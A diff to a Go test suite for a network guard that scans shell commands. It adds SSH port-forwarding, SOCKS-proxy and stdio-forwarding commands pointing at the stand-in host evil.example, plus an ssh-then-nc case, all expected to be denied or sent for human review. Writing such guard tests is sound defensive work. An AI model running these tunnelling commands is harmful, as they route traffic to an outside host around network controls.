@@ -103,6 +103,15 @@ func TestNetworkRuleDeniesDestinationRemapping(t *testing.T) {
 		"ssh -F none -oHostName=api.github.com alias",
 		"ssh -F none -Japi.github.com api.github.com",
 		"ssh -F none -vJevil.example api.github.com",
+		"ssh -F none -L 8080:evil.example:80 api.github.com",
+		"ssh -F none -L8080:evil.example:80 api.github.com",
+		"ssh -F none -R 8080:evil.example:80 api.github.com",
+		"ssh -F none -R8080:evil.example:80 api.github.com",
+		"ssh -F none -D 1080 api.github.com",
+		"ssh -F none -D1080 api.github.com",
+		"ssh -F none -W evil.example:80 api.github.com",
+		"ssh -F none -Wevil.example:80 api.github.com",
+		"ssh -F -- -L8080:evil.example:80 api.github.com",
 		"git -c http.proxy=http://api.github.com clone https://api.github.com/repo",
 	}
 	for _, command := range commands {
@@ -259,13 +268,31 @@ func TestNetworkRuleChecksSSHRemoteCommand(t *testing.T) {
 
 func TestNetworkRuleReviewsSafeSSHRemoteCommand(t *testing.T) {
 	guard := newNetworkTestGuard(t)
+	for _, command := range []string{
+		"ssh -F none api.github.com nc api.github.com 443",
+		"ssh -F none api.github.com echo -L",
+	} {
+		report, err := guard.Scan(context.Background(), scanCommand(command))
+		require.NoError(t, err)
+		require.Equal(t, DecisionNeedsHumanReview, report.Decision, command)
+		requireNetworkRule(t, report, ruleNetworkOptionReview)
+	}
+}
+
+func TestNetworkRuleTreatsSSHOperandAfterTerminatorLiterally(t *testing.T) {
+	guard := newNetworkTestGuard(t)
 	report, err := guard.Scan(
-		context.Background(),
-		scanCommand("ssh -F none api.github.com nc api.github.com 443"),
+		context.Background(), scanCommand("ssh -F none -- -L"),
 	)
 	require.NoError(t, err)
-	require.Equal(t, DecisionNeedsHumanReview, report.Decision)
-	requireNetworkRule(t, report, ruleNetworkOptionReview)
+	requireNotFinding(t, report, ruleNetworkDestinationMap)
+	requireNetworkRule(t, report, ruleNetworkTargetReview)
+
+	report, err = guard.Scan(
+		context.Background(), scanCommand("ssh -F -Lconfig api.github.com"),
+	)
+	require.NoError(t, err)
+	requireNotFinding(t, report, ruleNetworkDestinationMap)
 }
 
 func TestNetworkRuleDeniesProxyEnvironment(t *testing.T) {
